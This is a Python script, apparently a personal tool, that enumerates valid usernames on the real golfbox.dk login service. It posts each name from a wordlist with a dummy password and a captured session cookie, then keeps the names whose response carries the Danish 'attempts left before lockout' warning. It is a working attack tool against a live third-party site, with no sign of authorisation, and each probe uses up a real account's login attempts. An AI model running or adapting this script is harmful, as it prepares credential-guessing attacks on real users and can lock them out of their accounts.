import requests
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

class GolfBoxValidUsernameFinder:
    def __init__(self, username_file):
        with open(username_file, 'r') as uf:
            self.usernames = [line.strip() for line in uf]
            
        self.url_template = 'https://www.golfbox.dk/portal/login/testLogin.asp?user={}&pass=zaqwsx'
        
        self.headers = {
            'Accept': '*/*',
            'Accept-Language': 'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7,nl;q=0.6',
            'Connection': 'keep-alive',
            'Cookie': 'ASPSESSIONIDQEDTBRBS=NFELCNJCGFLNICKAHDAHNOBI; cookiePolicy=1; GolfGuideLocation=DK',
            'Referer': 'https://www.golfbox.dk/login.asp?selected={88FC5719-5D6E-45AA-9782-A8F69C25EDB1}',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android'
        }

    def save_valid_username(self, username):
        """Gemmer gyldige brugernavne i en fil."""
        with open("validUsernames_list.txt", "a") as f:
            f.write(username + "\n")
        print(f"Found valid username: {username}")

    def test_login(self, username):
        url = self.url_template.format(username)
        try:
            response = requests.post(url, headers=self.headers)
            if response.status_code == 200:
                return response.json(), username
            else:
                return {'txt': f"Server returned {response.status_code}"}, username
        except Exception as e:
            return {'txt': str(e)}, username

    def run(self, max_threads):
        total_attempts = len(self.usernames)
        progress_bar = tqdm(total=total_attempts, desc="Username Checks", dynamic_ncols=True)

        with ThreadPoolExecutor(max_threads) as executor:
            for username in self.usernames:
                result, used_username = self.test_login(username)
                # Tjek, om den specifikke besked findes i svaret
                if "Antal forsøg tilbage inden din konto bliver låst" in result.get("txt", ""):
                    self.save_valid_username(used_username)  # Gem det gyldige brugernavn
                progress_bar.update()

        progress_bar.close()

# Brug:
finder = GolfBoxValidUsernameFinder("usernames-list-short.txt")
finder.run(max_threads=10)
